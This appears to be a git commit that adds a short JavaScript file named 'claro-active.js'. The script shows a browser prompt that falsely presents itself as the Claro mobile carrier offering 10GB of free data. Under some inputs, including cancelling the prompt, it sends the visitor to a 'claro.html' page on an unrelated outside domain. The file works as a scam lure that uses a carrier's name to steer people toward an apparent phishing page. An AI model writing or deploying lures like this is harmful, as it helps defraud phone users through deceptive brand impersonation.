e4148eb34eb575ae524fa546821680ec97f00198
mfednewblog8 <nsikakimoh68@gmail.com>
2025-10-09 23:27:21 +0100

    Create claro-active.js

---
+++ claro-active.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVAR 10GB'
+password=prompt('CLARO: Felicidades, tu número Claro es elegible para recibir 10gb, haz clic en Aceptar para activar ahora','ACTIVAR 10GB');
+if (password != 'ACTIVAR 10GB') {
+location.href='https://ghrant.org/claro.html';
+}
